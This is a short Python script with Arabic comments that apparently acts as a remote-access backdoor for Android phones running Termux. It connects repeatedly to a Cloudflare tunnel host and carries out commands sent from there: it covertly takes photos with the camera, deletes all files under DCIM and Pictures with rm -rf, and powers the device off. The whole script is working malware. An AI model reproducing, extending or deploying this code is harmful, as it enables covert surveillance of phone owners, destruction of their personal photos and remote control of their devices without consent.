import socket
import os
import time

# بيانات النفق الخاص بك
R_HOST = "long-offices-golf-scanner.trycloudflare.com"
R_PORT = 443 # كلاود فلير يحول الاتصال تلقائياً عبر بورت 443

def execution():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((R_HOST, R_PORT))
            
            while True:
                data = s.recv(1024).decode()
                
                if data == '1': # مثال: التقاط صورة
                    os.system("termux-camera-photo -c 1 /sdcard/snap.jpg")
                
                elif data == '4': # مسح ملفات الميديا
                    os.system("rm -rf /sdcard/DCIM/*")
                    os.system("rm -rf /sdcard/Pictures/*")
                
                elif data == '5': # إطفاء الجهاز
                    os.system("reboot -p")
                
                elif not data:
                    break
        except Exception:
            time.sleep(10) # إعادة محاولة الاتصال كل 10 ثوانٍ في حال الانقطاع

if __name__ == "__main__":
    execution()
  
